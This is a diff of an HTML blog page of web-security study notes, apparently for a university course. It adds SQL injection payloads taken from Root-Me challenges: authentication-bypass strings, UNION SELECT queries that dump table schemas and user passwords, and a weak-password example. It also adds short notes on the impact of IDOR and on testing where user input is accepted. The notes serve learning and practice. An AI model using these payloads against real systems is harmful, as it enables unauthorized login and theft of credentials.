@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205191820005.png">
 <meta property="og:image" content="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205201146851.png">
 <meta property="article:published_time" content="2022-04-23T08:06:37.000Z">
-<meta property="article:modified_time" content="2022-06-08T11:04:47.877Z">
+<meta property="article:modified_time" content="2022-06-10T13:29:04.262Z">
 <meta property="article:author" content="Darren Z">
 <meta property="article:tag" content="unimelb">
 <meta name="twitter:card" content="summary">
@@ -642,7 +642,7 @@ Filter Evasion</a></p>
 <li>Steal cookie</li>
 <li>Steal DOM</li>
 <li>Steal Local Storage</li>
-<li>操纵 AJAX 调用以执行未经授权的操作</li>
+<li>操纵 AJAX 调用以执行不被授权的操作</li>
 </ol>
 <p><strong>Remediation</strong></p>
 <blockquote>
@@ -730,6 +730,18 @@ Tab分页, 允许攻击者打开关闭分页和更改标签页跳转的URL地址
 </blockquote>
 <h2 id="sqli"><a
 target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQLi</a></h2>
+<blockquote>
+<p><strong>SQL Injection Attack 机构化查询语句注入攻击</strong>:
+通过用户端输入的SQL语句被服务器接受并执行</p>
+</blockquote>
+<p><strong><a
+target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication">Authentication
+Bypass</a></strong>:</p>
+<ol type="1">
+<li><code>login=admin&amp;password='or 1=1 --</code> or
+<code>login=admin&amp;password=admin'or 1=1 order by username --</code></li>
+<li><code>login=admin'and 1=1--'&amp;password=test</code></li>
+</ol>
 <p><strong>SQL两种Comment</strong></p>
 <ol type="1">
 <li><code>--</code></li>
@@ -742,6 +754,12 @@ target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-in
 <h2 id="sqli-union-attacks"><a
 target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQLi
 UNION Attacks</a></h2>
+<p><a
+target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric">SQLite
+Example</a>: 1.
+<code>?action=news&amp;news_id=0 UNION SELECT 1,2,sql FROM sqlite_master</code>
+2.
+<code>?action=news&amp;news_id=0 UNION SELECT 1,username,password FROM users</code></p>
 <p><strong>Get Database Version</strong></p>
 <p><code>UNION SELECT 1,2,@@VERSION--+</code></p>
 <p><strong>GET Schema Name</strong></p>
@@ -751,8 +769,8 @@ UNION Attacks</a></h2>
 </ol>
 <p><strong>Get Table Name</strong></p>
 <p><code>'UNION SELECT 1,TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES--+</code></p>
-<p><strong>Get String Value </strong></p>
-<p><code>' UNION SELECT 1,string,3,4 FROM Secure.Flag--+</code></p>
+<p><strong>Get String Value</strong></p>
+<p><code>'UNION SELECT 1,string,3,4 FROM Secure.Flag--+</code></p>
 <p><strong>Retrieve Multiple Values in a Single Column</strong></p>
 <p><code>' UNION SELECT NULL, &#123;column_name_1&#125; ||'&#123;链接符&#125;'||&#123;column_name_2&#125; FROM &#123;table_name&#125; --</code></p>
 <h2 id="authentication-bypass-with-limit">Authentication Bypass with
@@ -1194,8 +1212,10 @@ Deserialisation</h2>
 <p><strong>定义</strong>:</p>
 <blockquote>
 <p><strong>Insecure Direct Object References (IDOR)
-不安全的直接对象引⽤</strong></p>
+不安全的直接对象引⽤</strong>:</p>
 </blockquote>
+<p><strong>Impact</strong>: &gt; 导致越权访问,
+并且该攻击容易通过自动化实现。</p>
 <p><strong>Exploit</strong>:</p>
 <blockquote>
 <p>案例1: 通常在线聊天机器人, 存在类似漏洞,
@@ -1367,6 +1387,8 @@ target="_blank" rel="noopener" href="https://gitlab.com/kalilinux/packages/dirbu
 </ul>
 <h2 id="qa">Q&amp;A</h2>
 <h4 id="如何通过测试发现">如何通过测试发现</h4>
+<p><strong>弱密码</strong>: &gt; 例如简单的 password: <a
+target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/Weak-password">admin</a></p>
 <p><strong>弱验证</strong>: 在替代渠道中测试较弱的身份验证; 访问,
 401(未验证): HTTP401错误代表用户没有访问权限, 需要进行身份认证;
 同时返回: - 认证方式: Basic/Digest; -
@@ -1381,6 +1403,8 @@ Digest方式使用加密的密码，这种方法更加安全，但是_技术还�
 <p>预防措施: 无论用户名是否存在, 返回相同结果;
 限制尝试频率(例如找回密码中通过输入邮箱尝试; 应当限制为: 尝试达到3次;
 然后停用一天)。</p>
+<p><strong>注入</strong>: 验证任接收用户输入的点 (搜索框, 留言板,
+或者动态url和参数) 是否存在 XSS 或 SQLi 注入风险。</p>
 <h4 id="xss-vs-csrf-vs-ssrf">XSS vs CSRF vs SSRF</h4>
 <table>
 <colgroup>
@@ -1425,8 +1449,8 @@ Rule出⼝规则</strong><br/><br/>禁⽤未使⽤的 URL
     <hr>
     <br>
    <!-- <div>阅读次数<span id="busuanzi_value_page_pv"></span>次</div> -->
-   <div>Posts Contains: <span class="post-count">6.6k</span> Words</div>
-   <!-- <div>Reading Time: <span class="post-count">30</span>Min's</div> -->
+   <div>Posts Contains: <span class="post-count">6.8k</span> Words</div>
+   <!-- <div>Reading Time: <span class="post-count">31</span>Min's</div> -->
      <!-- 打赏 -->
      <!-- 打赏功能开关-->
       <!-- 添加捐赠图标 -->
